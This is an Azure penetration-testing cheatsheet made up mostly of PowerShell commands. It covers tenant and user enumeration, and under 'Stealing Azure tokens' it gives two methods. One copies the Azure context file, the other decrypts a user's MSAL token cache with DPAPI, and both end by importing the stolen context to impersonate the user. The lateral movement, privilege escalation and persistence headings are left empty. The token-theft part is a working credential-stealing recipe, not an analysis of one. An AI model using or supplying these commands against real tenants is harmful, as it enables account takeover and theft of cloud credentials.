# Azure pentesting cheatsheet
## Enumeration
#### Connect to Azure
```
Connect-AzAccount
```

#### Connect to MSOL
```
connect-msolservice
```

#### Get basic information
- Interesting information:
  - UsersPermissionToReadOtherUsersEnabled
  - DirSyncServiceAccount
  - PasswordSynchronizationEnabled
  - Address/phone/emails
```
Get-MSolCompanyInformation
```

#### Get the AZ subscriptions the user has access too
```
Get-AzSubscription
```

#### List the current context
```
Get-AzContext | fl *
```

#### Enumerate the roles of the current user
```
Get-AzRoleAssignment
```

#### List users of the subscription
```
Get-MSolUser -All
```

#### Get all commands for AZ and MSOnline
```
Get-Module -Name Az.Accounts | Select-Object -ExpandProperty ExportedCommands
Get-Module -Name MSOnline | Select-Object -ExpandProperty ExportedCommands
```

## Lateral Movement

## Exploitation
### Stealing Azure tokens
- https://github.com/rvrsh3ll/TokenTactics
### Method 1
#### Save the AzureRmContext.json
```
cp %USERPROFILE%\.Azure\AzureRmContext.json C:\temp\AzureRmContext.json
```

#### Get the authenticated token for the user
```
Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect((([Text.Encoding]::Default).GetBytes((Get-Content -raw "$env:userprofile\AppData\Local\.IdentityService\msal.cache"))), $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
```

#### Save the token into AzureRmContext.json
-  Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

### Method 2
#### Save azcontext
```
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

## Privilege escalation

## Persistence
